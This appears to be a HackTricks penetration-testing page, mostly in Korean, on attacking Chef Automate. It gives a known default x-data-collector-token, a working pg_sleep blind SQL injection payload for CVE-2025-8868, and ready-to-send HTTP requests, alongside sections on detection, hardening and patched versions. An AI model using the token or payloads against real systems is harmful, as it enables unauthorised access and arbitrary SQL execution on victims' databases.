# Chef Automate Enumeration & Attacks

{{#include ../../banners/hacktricks-training.md}}

## 개요

이 페이지는 Chef Automate 인스턴스를 열거하고 공격하기 위한 실용적인 기법을 모아두었으며, 다음 항목에 중점을 둡니다:
- gRPC-Gateway-backed REST endpoints를 발견하고 validation/오류 응답을 통해 요청 스키마를 유추
- 기본값이 남아 있는 경우 x-data-collector-token 인증 헤더 남용
- Compliance API (CVE-2025-8868)에서 /api/v0/compliance/profiles/search의 filters[].type 필드에 영향을 주는 Time-based blind SQL injection

> 참고: grpc-metadata-content-type: application/grpc 헤더를 포함하는 백엔드 응답은 일반적으로 REST 호출을 gRPC 서비스로 브리지하는 gRPC-Gateway를 의미합니다.

## Recon: Architecture and Fingerprints

- Front-end: Often Angular. 정적 번들은 REST 경로(예: /api/v0/...)를 유추할 수 있습니다.
- API transport: REST to gRPC via gRPC-Gateway
- Responses may include grpc-metadata-content-type: application/grpc
- Database/driver fingerprints:
- Error bodies starting with pq: strongly suggest PostgreSQL with the Go pq driver
- Interesting Compliance endpoints (auth required):
- POST /api/v0/compliance/profiles/search
- POST /api/v0/compliance/scanner/jobs/search

## Auth: Data Collector Token (x-data-collector-token)

Chef Automate는 전용 헤더로 요청을 인증하는 data collector를 노출합니다:

- Header: x-data-collector-token
- Risk: 일부 환경에서는 보호된 API 경로에 접근할 수 있는 기본 토큰이 남아 있을 수 있습니다. 실세계에서 관찰된 알려진 기본값:
- 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

해당 토큰이 존재하면 인증이 필요한 Compliance API 엔드포인트를 호출하는 데 사용될 수 있습니다. 하드닝 시 기본값을 교체하거나 비활성화하도록 항상 시도하십시오.

## API Schema Inference via Error-Driven Discovery

gRPC-Gateway-backed endpoints often leak 유용한 검증 오류를 통해 예상되는 요청 모델을 드러냅니다.

For /api/v0/compliance/profiles/search, the backend expects a body with a filters array, where each element is an object with:

- type: string (filter field identifier)
- values: array of strings

Example request shape:
```json
{
"filters": [
{ "type": "name", "values": ["test"] }
]
}
```
잘못된 JSON이나 잘못된 필드 타입은 일반적으로 힌트를 포함한 4xx/5xx 응답을 유발하며, 헤더는 gRPC-Gateway의 동작을 나타냅니다. 이를 사용해 필드를 매핑하고 인젝션 표면을 국지화하세요.

## 컴플라이언스 API SQL Injection (CVE-2025-8868)

- 영향받는 엔드포인트: POST /api/v0/compliance/profiles/search
- Injection point: filters[].type
- 취약성 분류: time-based blind SQL injection in PostgreSQL
- 근본 원인: dynamic SQL fragment에 type 필드를 보간할 때 적절한 parameterization/whitelisting이 없어 발생합니다(대개 identifiers/WHERE clauses를 구성하는 데 사용됨). type에 포함된 조작된 값이 PostgreSQL에서 평가됩니다.

동작하는 time-based payload:
```json
{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Technique notes:
- 원래 문자열을 single quote로 닫습니다
- pg_sleep(N)을 호출하는 subquery를 연결합니다
- ||을 통해 string context로 다시 진입하여 최종 SQL이 type이 삽입된 위치와 관계없이 문법적으로 유효하도록 합니다

### differential latency를 통한 검증

paired requests를 보내고 response times를 비교하여 서버 측 실행을 검증합니다:

- N = 1 second
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(1))||'","values":["test"]}]}
```
- N = 5초
```
POST /api/v0/compliance/profiles/search HTTP/1.1
Host: <target>
Content-Type: application/json
x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

{"filters":[{"type":"name'||(SELECT pg_sleep(5))||'","values":["test"]}]}
```
Observed behavior:
- Response times scale with pg_sleep(N)
- HTTP 500 responses may include pq: details during probing, confirming SQL execution paths

> 팁: 타이밍 검증기(예: 통계 비교를 위한 다중 시도)를 사용하여 노이즈와 오탐을 줄이세요.

### 영향

인증된 사용자 또는 기본 x-data-collector-token을 악용하는 인증되지 않은 행위자는 Chef Automate의 PostgreSQL 컨텍스트에서 임의의 SQL을 실행할 수 있으며, 이로 인해 컴플라이언스 프로파일, 구성 및 텔레메트리의 기밀성과 무결성이 위협받을 수 있습니다.

### 영향을 받는 버전 / 수정

- CVE: CVE-2025-8868
- 업그레이드 권고: 벤더 권고에 따라 Chef Automate 4.13.295 이상 (Linux x86)

## 탐지 및 포렌식

- API layer:
- /api/v0/compliance/profiles/search에서 filters[].type에 따옴표('), 연결(||) 또는 pg_sleep 같은 함수 참조가 포함된 경우 500 응답을 모니터링하세요
- grpc-metadata-content-type 응답 헤더를 검사하여 gRPC-Gateway 흐름을 식별하세요
- Database layer (PostgreSQL):
- pg_sleep 호출과 잘못된 식별자 오류를 감사하세요(종종 Go pq 드라이버에서 오는 pq: 접두사로 표출됩니다)
- Authentication:
- 특히 알려진 기본값을 포함한 x-data-collector-token 사용을 API 경로 전반에서 로그 및 알림으로 기록하세요

## 완화 및 하드닝

- 즉각적인 조치:
- 기본 data collector 토큰을 교체하거나 비활성화하세요
- data collector 엔드포인트로의 인그레스를 제한하고 강력하고 고유한 토큰을 적용하세요
- 코드 수준:
- 쿼리를 파라미터화하세요; SQL 조각을 문자열로 연결하지 마세요
- 서버에서 허용되는 type 값을 엄격히 화이트리스트화하세요 (enum)
- 식별자/절에 대한 동적 SQL 조립을 피하세요; 동적 동작이 필요하다면 안전한 식별자 인용과 명시적 화이트리스트를 사용하세요

## 실전 테스트 체크리스트

- x-data-collector-token이 수락되는지, 알려진 기본값이 동작하는지 확인하세요
- 검증 오류를 유발하고 오류 메시지/헤더를 읽어 Compliance API 요청 스키마를 매핑하세요
- 값 배열이나 최상위 텍스트 필드뿐만 아니라 덜 명백한 “식별자-유사” 필드(예: filters[].type)에서 SQLi를 테스트하세요
- 연결(concatenation)을 사용한 시간 기반 기법으로 문맥 전반에서 SQL이 구문상 유효하도록 유지하세요

## References

- [Cooking an SQL Injection Vulnerability in Chef Automate (XBOW blog)](https://xbow.com/blog/cooking-an-sql-injection-vulnerability-in-chef-automate)
- [Timing trace (XBOW)](https://xbow-website.pages.dev/traces/chef-automate-sql-injection/)
- [CVE-2025-8868](https://www.cve.org/CVERecord?id=CVE-2025-8868)
- [gRPC-Gateway](https://github.com/grpc-ecosystem/grpc-gateway)
- [pq PostgreSQL driver for Go](https://github.com/lib/pq)

{{#include ../../banners/hacktricks-training.md}}
